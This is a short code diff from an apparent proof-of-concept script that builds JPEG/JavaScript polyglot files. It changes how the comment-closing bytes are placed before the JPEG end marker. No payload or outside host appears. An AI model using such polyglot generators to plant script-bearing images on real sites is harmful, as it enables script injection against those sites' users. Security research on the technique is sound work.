@@ -60,7 +60,7 @@ def gen_file(content, outfile):
     # prevent "*" char in your jpeg file from closing your comment
     rest = rest.replace(b'*/', b'*\x2a')
     # close the comment with "*/"
-    rest = rest.replace(b'\xfb\x95\xff\xd9', b'\xfb\x95\x2a\x2f\x2f\x2f\xff\xd9')
+    rest = rest.replace(b'\xff\xd9', b'\x2a\x2f\x2f\x2f\xff\xd9')
     poc = MAGIC_HEADER + header + rest
     with open(outfile, 'wb') as f:
         f.write(poc)
